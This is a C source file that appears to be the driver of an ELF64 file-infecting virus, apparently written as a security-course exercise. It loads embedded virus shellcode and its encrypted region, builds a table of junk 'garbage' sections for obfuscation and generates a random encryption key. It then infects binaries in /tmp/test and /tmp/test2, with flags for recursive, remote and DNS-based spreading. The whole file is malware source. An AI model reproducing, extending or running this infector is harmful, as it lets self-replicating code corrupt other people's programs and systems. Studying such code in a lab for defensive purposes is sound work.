#include "lib/lib.h"
#include "lib/infect.h"
#include "lib/elf64.h"
#include "virus_shellcode.h"
#include "virus_table.h"

char key[16];

int usage(char *name){
	print("usage: ./");
	print(name);
	print(" binary\n\nnote: the binary must be in elf64\n");
	return -1;
}

int randomize(char *k){
	int             fd;

	if ((fd = ft_open("/dev/urandom", 0, 0)) == -1)
		return FALSE;
	ft_read(fd, (char *)k, sizeof(*k)*16);
	ft_close(fd);
	return TRUE;
}

int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
	int64_t bin_start_off;
	int64_t bin_end_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
	(*v) = virus_shellcode + bin_start_off;
	(*l) = bin_end_off - bin_start_off; 

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", (int64_t*)c_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", (int64_t*)c_len);
	(*c_len) = (*c_len)-(*c_off);
	(*c_off) -= bin_start_off; 

	return TRUE;
}

#define STR_GB_START ".garb_start"
#define STR_GB_END ".garb_end"

int set_garbage_infos(){
	int64_t bin_start_off;
	char **names = NULL;
	
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
	
	int64_t off_gt_len;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table_len", &off_gt_len);
 	uint32_t gt_len = ((uint32_t *)((char *)(virus_shellcode + off_gt_len)))[0];
	
	int64_t off_gt;
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table", &off_gt);
	Garbage *gt = ((Garbage *)((char *)(virus_shellcode + off_gt)));

    Elf64_Shdr *symtab = NULL;
    Elf64_Shdr *strtab = NULL;

	if (!elf_get_tabs(virus_shellcode, virus_shellcode_len, &symtab, &strtab))
		return FALSE;

    Elf64_Sym *sym = (void*)(((char*)virus_shellcode) + symtab->sh_offset);
    char *strs = ((char*)virus_shellcode) + strtab->sh_offset;

	uint32_t x = 0;
	uint32_t n = (symtab->sh_size / sizeof(Elf64_Sym));
    for (size_t i = 0; i < n; i++) {
		//WARNING: this algo may not work on other the linker
        if (startswith(strs + sym[i].st_name, STR_GB_START)){
			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, STR_GB_END) &&
				str_equal(strs + sym[i].st_name + slen(STR_GB_START),
							 strs + sym[i+1].st_name + slen(STR_GB_END))))
				return FALSE;
			gt[x] = (Garbage){sym[i].st_value - bin_start_off, sym[i+1].st_value - sym[i].st_value};
			//skip next
			x += 1;
			i += 1;
        }
    }
	if (x != gt_len) return FALSE;
}

int main(int ac, char **av){
	(void)ac;
	(void)av;

	char *virus;
	size_t virus_len;
	size_t crypt_off;
	size_t crypt_len;
	struct s_opt opt = {FALSE, FALSE, FALSE};
	if (!set_garbage_infos())
		return 2;
	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
		return 1;
	randomize(key);
	for (int i = 1; i < ac; i ++){
		if (str_equal(av[i], "--recur"))
			opt.do_recur = TRUE;
		else if (str_equal(av[i], "--remote"))
			opt.do_remote = TRUE;
		else if (str_equal(av[i], "--msg"))
			opt.print_msg = TRUE;
		else if (str_equal(av[i], "--dns_remote"))
			opt.do_dns_remote = TRUE;
		//else if (str_equal(av[i], "--big-recur"))
		//	opt.print_msg = TRUE;
	
	}
	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
	return 0;
}
